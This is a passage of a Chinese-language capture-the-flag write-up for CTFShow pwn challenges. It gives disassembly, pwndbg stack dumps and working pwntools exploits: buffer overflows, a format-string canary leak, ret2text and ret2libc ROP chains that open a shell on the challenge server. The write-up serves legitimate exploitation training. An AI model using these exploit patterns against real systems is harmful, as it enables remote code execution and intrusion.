io.recvuntil('\n\n')
puts_address = u32(io.recv(4)) # 接收4个字节并解包
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本,libc6-i386_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')  # libc的基址=puts()函数地址-puts()函数偏移地址(0x67360)
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址(0x03cd10)
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址(0x17b8cf)
log.success('bin_sh_address => %s' % hex(bin_sh_address))
payload = b'a'*0x9 + b'fuck' + p32(system_address) + p32(0xdeadbeef) + p32(bin_sh_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn03/5.png)

------

### pwn04

先`file ./ex2`查看文件类型再`checksec --file=./ex2`检查文件保护情况。

```bash
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfshow]
└─$ file ./ex2 
./pwn04: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6109b31b5fb5bcbef1eb882cf8d59afb93900352, not stripped
                                                                   
┌──(tyd㉿kali-linux)-[~/ctf/pwn/ctfshow]
└─$ checksec --file=./ex2 
[*] '/home/tyd/ctf/pwn/ctfshow/ex2'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

用`IDA Pro 32bit`打开附件`ex2`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  init();
  puts("Hello Hacker!");
  vuln();
  return 0;
}
```

双击进入`vuln()`函数，发现该函数存在格式化字符串漏洞。

```c
unsigned int vuln()
{
  int i; // [esp+4h] [ebp-74h]
  char buf[100]; // [esp+8h] [ebp-70h] BYREF
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  for ( i = 0; i <= 1; ++i )
  {
    read(0, buf, 0x200u);
    printf(buf);
  }
  return __readgsdword(0x14u) ^ v3;
}
```

用`pwndbg`进行分析：

```bash
$gdb ./ex2
pwndbg> disass vuln
Dump of assembler code for function vuln:
   0x0804862e <+0>:     push   ebp
   0x0804862f <+1>:     mov    ebp,esp
   0x08048631 <+3>:     sub    esp,0x78
   0x08048634 <+6>:     mov    eax,gs:0x14
   0x0804863a <+12>:    mov    DWORD PTR [ebp-0xc],eax    # canary
   0x0804863d <+15>:    xor    eax,eax
   0x0804863f <+17>:    mov    DWORD PTR [ebp-0x74],0x0
   0x08048646 <+24>:    jmp    0x8048671 <vuln+67>
   0x08048648 <+26>:    sub    esp,0x4
   0x0804864b <+29>:    push   0x200
   0x08048650 <+34>:    lea    eax,[ebp-0x70]
   0x08048653 <+37>:    push   eax
   0x08048654 <+38>:    push   0x0
   0x08048656 <+40>:    call   0x8048430 <read@plt>
   0x0804865b <+45>:    add    esp,0x10
   0x0804865e <+48>:    sub    esp,0xc
   0x08048661 <+51>:    lea    eax,[ebp-0x70]
   0x08048664 <+54>:    push   eax
   0x08048665 <+55>:    call   0x8048440 <printf@plt>    # printf地址
   0x0804866a <+60>:    add    esp,0x10
   0x0804866d <+63>:    add    DWORD PTR [ebp-0x74],0x1
   0x08048671 <+67>:    cmp    DWORD PTR [ebp-0x74],0x1
   0x08048675 <+71>:    jle    0x8048648 <vuln+26>
   0x08048677 <+73>:    nop
   0x08048678 <+74>:    mov    eax,DWORD PTR [ebp-0xc]
   0x0804867b <+77>:    xor    eax,DWORD PTR gs:0x14
   0x08048682 <+84>:    je     0x8048689 <vuln+91>
   0x08048684 <+86>:    call   0x8048450 <__stack_chk_fail@plt>
   0x08048689 <+91>:    leave  
   0x0804868a <+92>:    ret    
End of assembler dump.
pwndbg> b *0x8048665
Breakpoint 1 at 0x8048665
pwndbg> run
Starting program: /home/tyd/ctf/pwn/ctfshow/pwn04 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Hello Hacker!
AAAA  # 随便输入

Breakpoint 1, 0x08048665 in vuln ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 EAX  0xffffcf48 ◂— 0x41414141 ('AAAA')
 EBX  0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
 ECX  0xffffcf48 ◂— 0x41414141 ('AAAA')
 EDX  0x200
 EDI  0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
 ESI  0x80486e0 (__libc_csu_init) ◂— push   ebp
 EBP  0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
 ESP  0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
 EIP  0x8048665 (vuln+55) —▸ 0xfffdd6e8 ◂— 0x0
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
 ► 0x8048665 <vuln+55>    call   printf@plt                     <printf@plt>
        format: 0xffffcf48 ◂— 0x41414141 ('AAAA')
        vararg: 0xffffcf48 ◂— 0x41414141 ('AAAA')
 
   0x804866a <vuln+60>    add    esp, 0x10
   0x804866d <vuln+63>    add    dword ptr [ebp - 0x74], 1
   0x8048671 <vuln+67>    cmp    dword ptr [ebp - 0x74], 1
   0x8048675 <vuln+71>    jle    vuln+26                     <vuln+26>
 
   0x8048677 <vuln+73>    nop    
   0x8048678 <vuln+74>    mov    eax, dword ptr [ebp - 0xc]
   0x804867b <vuln+77>    xor    eax, dword ptr gs:[0x14]
   0x8048682 <vuln+84>    je     vuln+91                     <vuln+91>
 
   0x8048684 <vuln+86>    call   __stack_chk_fail@plt                     <__stack_chk_fail@plt>
 
   0x8048689 <vuln+91>    leave  
────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ esp     0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
01:0004│         0xffffcf34 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
02:0008│         0xffffcf38 ◂— 0x200
03:000c│         0xffffcf3c —▸ 0xf7c80183 (_IO_file_overflow+275) ◂— add    esp, 0x10
04:0010│         0xffffcf40 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│         0xffffcf44 ◂— 0x0
06:0018│ eax ecx 0xffffcf48 ◂— 0x41414141 ('AAAA')
07:001c│         0xffffcf4c —▸ 0xf7e1cf0a ◂— 0xdec0f7e1
──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0 0x8048665 vuln+55
   f 1 0x80486c1 main+54
   f 2 0xf7c23295 __libc_start_call_main+117
   f 3 0xf7c23358 __libc_start_main+136
   f 4 0x80484c1 _start+33
──────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x $ebp-0xc
0xffffcfac:     0x5222d900
pwndbg> stack 0x28
00:0000│ esp     0xffffcf30 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')  # 栈顶 printf的地址
01:0004│         0xffffcf34 —▸ 0xffffcf48 ◂— 0x41414141 ('AAAA')
02:0008│         0xffffcf38 ◂— 0x200
03:000c│         0xffffcf3c —▸ 0xf7c80183 (_IO_file_overflow+275) ◂— add    esp, 0x10
04:0010│         0xffffcf40 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
05:0014│         0xffffcf44 ◂— 0x0
06:0018│ eax ecx 0xffffcf48 ◂— 0x41414141 ('AAAA')      # 输入字符串的起点
07:001c│         0xffffcf4c —▸ 0xf7e1cf0a ◂— 0xdec0f7e1
08:0020│         0xffffcf50 —▸ 0xf7c116e4 ◂— 0x3c04
09:0024│         0xffffcf54 ◂— 0x20 /* ' ' */
0a:0028│         0xffffcf58 —▸ 0xf7c80af9 (__overflow+9) ◂— add    ebx, 0x19c4fb
0b:002c│         0xffffcf5c —▸ 0xf7e1ba40 (_IO_file_jumps) ◂— 0x0
0c:0030│         0xffffcf60 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
0d:0034│         0xffffcf64 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
0e:0038│         0xffffcf68 —▸ 0xffffcfa8 —▸ 0xffffcfd8 ◂— 0x0
0f:003c│         0xffffcf6c —▸ 0xf7c74f3b (puts+395) ◂— add    esp, 0x10
10:0040│         0xffffcf70 —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
11:0044│         0xffffcf74 ◂— 0xa /* '\n' */
12:0048│         0xffffcf78 ◂— 0xd /* '\r' */
13:004c│         0xffffcf7c —▸ 0xf7c7b7b0 (setbuf) ◂— sub    esp, 0x10
14:0050│         0xffffcf80 —▸ 0xf7e1d620 (_IO_2_1_stdin_) ◂— 0xfbad208b
15:0054│         0xffffcf84 ◂— 0x7d4
16:0058│         0xffffcf88 —▸ 0x804a064 (stdout@@GLIBC_2.0) —▸ 0xf7e1dda0 (_IO_2_1_stdout_) ◂— 0xfbad2887
17:005c│         0xffffcf8c ◂— 0xd /* '\r' */
18:0060│         0xffffcf90 —▸ 0xffffcfd8 ◂— 0x0
19:0064│         0xffffcf94 —▸ 0xf7fdb8d0 (_dl_runtime_resolve+16) ◂— pop    edx
1a:0068│         0xffffcf98 —▸ 0xf7e1e9ac (_IO_stdfile_2_lock) ◂— 0x0
1b:006c│         0xffffcf9c —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
1c:0070│         0xffffcfa0 —▸ 0x80486e0 (__libc_csu_init) ◂— push   ebp
1d:0074│         0xffffcfa4 —▸ 0xf7ffcb80 (_rtld_global_ro) ◂— 0x0
1e:0078│         0xffffcfa8 —▸ 0xffffcfd8 ◂— 0x0
1f:007c│         0xffffcfac ◂— 0x5222d900   # canary偏移量为0x1f即31,可以通过%31$x泄露
20:0080│         0xffffcfb0 —▸ 0x8048768 ◂— dec    eax /* 'Hello Hacker!' */
21:0084│         0xffffcfb4 —▸ 0xf7fd98cb (_dl_fixup+235) ◂— mov    edi, eax
22:0088│ ebp     0xffffcfb8 —▸ 0xffffcfd8 ◂— 0x0
23:008c│         0xffffcfbc —▸ 0x80486c1 (main+54) ◂— mov    eax, 0
24:0090│         0xffffcfc0 —▸ 0xffffd000 —▸ 0xf7e1cff4 (_GLOBAL_OFFSET_TABLE_) ◂— 0x21cd8c
25:0094│         0xffffcfc4 —▸ 0xf7fc1678 —▸ 0xf7ffdbac —▸ 0xf7fc1790 —▸ 0xf7ffda40 ◂— ...
26:0098│         0xffffcfc8 —▸ 0xf7fc1b40 —▸ 0xf7c1f2bc ◂— 'GLIBC_PRIVATE'
27:009c│         0xffffcfcc ◂— 0x5222d900  # ret地址
```

字符串起点到`canary`的长度为`0xffffcfac-0xffffcf48=100`，因此构造`payload`时先用`100`个字节填充`padding`，接着写入`canary`的值，接着填充`0xffffcfc8-0xffffcfbc=12`个字节，最后用`getshell`的地址覆盖掉返回地址。

编写`Python`代码求解，得到`ctfshow{65bab64a-1dc2-4524-a1aa-227f6b5ec590}`。

```python
from pwn import *

context(arch='i386', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28105)
elf = ELF('./pwn04')
getshell = elf.symbols['getshell']  # 0x804859b
log.success('getshell => %s', hex(getshell))
io.recvuntil('Hello Hacker!\n')
io.sendline(b'%31$x')
canary = int(io.recv(), 16)
payload = b'a'*100 + p32(canary) + b'a'*12 + p32(getshell)
io.sendline(payload)
io.interactive()
```

------

### pwn05

先`file ./pwn05`查看文件类型再`checksec --file=pwn05`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn05/1.png)

用`IDA Pro 32bit`打开附件`pwn05`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn05/2.png)

双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x14`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn05/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn05/4.png)

在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn05/5.png)

编写`Python`代码即可得到`ctfshow{ea894e9a-2450-417a-92f3-7ff289ce115e}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28182)
e = ELF('pwn05')
address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(address).upper())
payload = b'a'*(0x14 + 0x4) + p32(address)
# payload = b'a'*(0x14 + 0x4) + p32(0x8048486)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn05/6.png)

------

### pwn06

先`file ./pwn06`查看文件类型和`checksec --file=pwn06`检查一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn06/1.png)

用`IDA Pro 64bit`打开附件`pwn06`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn06/2.png)

双击进入`welcome()`函数，可以看到该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn06/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x14`个字节占满`s`变量，然后再加上`r`的`8`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn06/4.png)

需要注意的是这题`pwn06`就是上一题`pwn05`的`64`位版本，所以需要加上`welcome()`函数的起始地址来平衡堆栈。

在`Function Window`中注意到有一个名为`getFlag()`的函数，函数返回值直接是系统调用，因此构造`payload`时需要再加上这个`getFlag()`函数的起始地址即可。

![](https://paper.tanyaodan.com/CTFShow/pwn06/5.png)

编写`Python`代码即可得到`ctfshow{384e6120-ef80-45f0-afe9-f64929450397}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28194)
e = ELF('pwn06')
welcome_address = e.symbols['welcome']
log.success('welcome_address => %s' % hex(welcome_address).upper())
getFlag_address = e.symbols['getFlag']
log.success('getFlag_address => %s' % hex(getFlag_address).upper())
payload = b'a'*0xc + b'fuckpwn!' + p64(welcome_address) + p64(getFlag_address)
# payload = b'a'*0xc + b'fuckpwn!' + p64(0x40058F) + p64(0x400577)
io.sendline(payload)
io.interactive()
```

------

### pwn07

先`file ./pwn07`查看文件类型再`checksec --file=pwn07`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/pwn07/1.png)

用`IDA Pro 64bit`打开附件`pwn07`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/pwn07/2.png)

双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0xc`，即可用栈大小只有`12`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/pwn07/3.png)

双击`s`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0xc`个字节占满`s`变量，然后再加上`r`的`4`个字节。

![](https://paper.tanyaodan.com/CTFShow/pwn07/4.png)

有没有发现这题`pwn07`和上面的`pwn03`很像？没错，这简直就是`pwn03`的`64`位版本，不过在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```bash
ROPgadget --binary ./pwn07 --only "pop|ret"
```

![](https://paper.tanyaodan.com/CTFShow/pwn07/5.png)

解题思路都是：在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。这种类型的题还是有一定套路的：

```python
e = ELF('pwn')
# 获取32位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
payload = b'a'*offset + p32(e.plt['xx']) + p32(ret_address) + p32(e.got['xx'])
# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造32位版本的shellcode
payload = b'a'*offset + p32(system_address) + p32(0) + p32(bin_sh_address) #p32(0xdeadbeef)或p32(0)或b'a'*4

# 获取64位版本的got表中的xx函数真实地址,再根据libc中xx函数的偏移地址来算出libc的基址地址
payload = b'a'*offset + p64(pop_rdi) + p64(e.got['xx']) + p64(e.plt['xx']) + p64(ret_address)
# 根据libc的基址地址和偏移地址算出system()和'/bin/sh'的真实地址后,构造64位版本的shellcode
payload = b'a'*offset + p64(ret_address) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
```

编写`Python`代码即可得到`ctfshow{03a97f04-a802-4c2e-a013-b86a120f034f}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('pwn07')
io = remote('pwn.challenge.ctf.show', 28199)
e = ELF('pwn07')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
pop_rdi = 0x4006e3 # ROPgadget --binary ./pwn07 --only "pop|ret"
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
payload = b'a'*0xc + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendline(payload)
io.recvline()
puts_address = io.recv().strip(b'\n')
log.success('io.recv().strip(b\\n\') => %s', puts_address)
puts_address = u64(puts_address.ljust(8, b'\x00'))  # 地址只有6bytes, 补到8位才能unpack
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.31-8_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system')
log.success('system_address => %s' % hex(system_address)) # system()函数的地址=libc的基址+system()函数偏移地址
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c6 # ROPgadget --binary ./pwn07 --only "pop|ret"
payload = b'a'*0xc + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address) 
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/pwn07/6.png)

------

### ret2text

先`file ./ret2text`查看文件类型再`checksec --file=ret2text`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/ret2text/1.png)

用`IDA Pro 64bit`打开附件`ret2text`，按`F5`反汇编源码并查看主函数，发现`welcome()`函数很可疑。

![](https://paper.tanyaodan.com/CTFShow/ret2text/2.png)

双击`welcome()`函数查看详情，发现该函数中有个局部变量`s`是`char`型数组，`s`的长度只有`0x80`，即可用栈大小只有`128`字节，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

![](https://paper.tanyaodan.com/CTFShow/ret2text/3.png)

在`Function Window`中注意到有一个名为`ctfshow()`的函数，函数返回值直接是系统调用`system('/bin/sh')`。

![](https://paper.tanyaodan.com/CTFShow/ret2text/4.png)

构造`payload`时可以先用`0x80`个字节占满`s`变量，再加上`rbp`的`8`个字节，然后加上`ctfshow()`函数的起始地址即可。然而我第一次编写的`Python`代码直接超时啦`timeout: the monitored command dumped core`。

```python
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
# io = process('ret2text')
io = remote('pwn.challenge.ctf.show', 28067)
e = ELF('ret2text')
ctfshow_address = e.symbols['ctfshow']
log.success('ctfshow_address => %s' % hex(ctfshow_address).upper())
payload = b'a'*0x80 + b'fuckpwn!' + p64(ctfshow_address)
# payload = b'a'*0x80 + b'fuckpwn!' + p64(0x400637)
io.sendline(payload)
io.interactive()
```

那`payload`就不要加上`ctfshow()`函数的起始地址了，直接添加系统调用`system('/bin/sh')`的地址`0x40063B`。

![](https://paper.tanyaodan.com/CTFShow/ret2text/5.png)

编写`Python`代码即可得到`ctfshow{19efd671-89fa-4f27-8898-aaedfea5bb2c}`。

```python
from pwn import *

io = remote('pwn.challenge.ctf.show', 28067)
payload = b'a'*0x80 + b'fuckpwn!' + p64(0x40063B)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/ret2text/6.png)

------

### babystack

同[**bjdctf_2020_babystack**](https://buuoj.cn/challenges#bjdctf_2020_babystack)

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')
# io = process('./ret2text')
io = remote('pwn.challenge.ctf.show', 28117)
e = ELF('./ret2text')
io.sendlineafter(b'Please input the length of your name:', b'100')
backdoor_address = e.symbols['backdoor'] # 0x4006E6
log.success('backdoor_address => %s' % hex(backdoor_address))
payload = b'a'*0x10 + b'fuckpwn!' + p64(backdoor_address)
io.sendlineafter(b'What\'s u name?', payload)
io.interactive()
```

### babyroute

同[**bjdctf_2020_babyrop**](https://buuoj.cn/challenges#bjdctf_2020_babyrop)

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28052)
e = ELF('./babyrouter')
puts_plt = e.plt['puts']
log.success('puts_plt => %s' % hex(puts_plt))
puts_got = e.got['puts']
log.success('puts_got => %s' % hex(puts_got))
main_address = e.symbols['main']
log.success('main_address => %s' % hex(main_address))
pop_rdi = 0x400733 # ROPgadget --binary ./babyrouter --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
log.success('puts_address => %s' % hex(puts_address))
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
log.success('libcbase_address => %s' % hex(libcbase))
system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
log.success('system_address => %s' % hex(system_address))
bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
log.success('bin_sh_address => %s' % hex(bin_sh_address))
pop_ret = 0x4004c9 # ROPgadget --binary ./babyrouter --only "pop|ret"
payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
io.interactive()
```

------

### 1024_happy_stack

先`file ./1024_happy_stack`查看文件类型再`checksec --file=1024_happy_stack`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/1.png)

用`IDA Pro 64bit`打开附件`1024_happy_stack`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x380`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。注意到`ctfshow()`函数的返回值为真时会结束程序。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/2.png)

双击`ctfshow()`函数查看详情，函数返回值直接是`strcmp()`的比较结果。`strcmp()`函数是用于比较两个字符串并根据比较结果返回整数。基本形式为`strcmp(str1,str2)`，若`str1=str2`，则返回零；若`str1<str2`，则返回负数；若`str1>str2`，则返回正数。也就是说从`main()`函数中传入的参数和字符串`"36D"`的`strcmp()`比较结果必须为`0`才能执行主函数中的`puts()`函数。有什么办法能够让变量`s`造成栈溢出的同时又能与`"36D"`的比较结果相等呢？构造`payload`时可以利用`\x00`来让`s`和`"36D"`匹配上。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/3.png)

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/4.png)

编写`Python`代码即可得到`ctfshow{ed60fbe2-5815-456a-abc1-4b45fd120cf0}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28088)
# io = process('./1024_happy_stack')
e = ELF('./1024_happy_stack')
payload = b'36D\x00'.ljust(0x388, b'a')
pop_rdi = 0x400803 # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
puts_plt = e.plt['puts']
info('puts_plt => 0x%x', puts_plt)
puts_got = e.got['puts']
info('puts_got => 0x%x', puts_got)
main_address = e.symbols['main']
payload += flat(pop_rdi, puts_got, puts_plt, main_address)
io.recv()
io.sendline(payload)
io.recvuntil(b'36D\n')
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
log.success('puts_address => 0x%x', puts_address)
pop_ret = 0x40028a # ROPgadget --binary ./1024_happy_stack --only "pop|ret"
libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.27-3ubuntu1_amd64
libcbase = puts_address - libc.dump('puts')
system_address = libcbase + libc.dump('system')
info('system_address => 0x%x', system_address)
bin_sh_address = libcbase + libc.dump(('str_bin_sh'))
info('bin_sh_address => 0x%x', bin_sh_address)
payload = b'36D\x00'.ljust(0x388, b'a')
payload += flat(pop_ret, pop_rdi, bin_sh_address, system_address)
io.sendline(payload)
io.interactive()
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_stack/5.png)

------

------

### 1024_happy_checkin

先`file ./1024_happy_checkin`查看文件类型再`checksec --file=1024_happy_checkin`检查了一下文件保护情况。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/1.png)

用`IDA Pro 64bit`打开附件`1024_happy_checkin`，按`F5`反汇编源码并查看主函数，发现有个`char`型数组变量`s`，`s`的长度只有`0x370`，但是`gets()`函数读取输入到变量`s`时并没有限制输入，显然存在栈溢出漏洞。

在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/2.png)

在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。

```bash
ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
```

![](https://paper.tanyaodan.com/CTFShow/1024_happy_checkin/3.png)

编写`Python`代码即可得到`ctfshow{851446cc-4ff9-4a2b-945d-f901ca234ba8}`。

```python
from pwn import *
from LibcSearcher import *

context(arch='amd64', os='linux', log_level='debug')
io = remote('pwn.challenge.ctf.show', 28107)
e = ELF('./1024_happy_checkin')
pop_rdi = 0x4006e3 # ROPgadget --binary ./1024_happy_checkin --only "pop|ret"
puts_plt = e.plt['puts']
info('puts_plt => 0x%x', puts_plt)
puts_got = e.got['puts']
info('puts_got => 0x%x', puts_got)
main_address = e.symbols['main']
info('main_address => 0x%x', main_address)
payload = b'a'*0x370 + b'pwn1024!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
io.sendlineafter(b'welcome_to_ctfshow_1024_cup,input_your_ticket\n', payload)
io.recvline()
puts_address = u64(io.recv(6).ljust(8, b'\x00'))
libc = LibcSearcher('puts', puts_address) # libc版本, libc6_2.27-0ubuntu3_amd64 or libc6_2.27-3ubuntu1_amd64
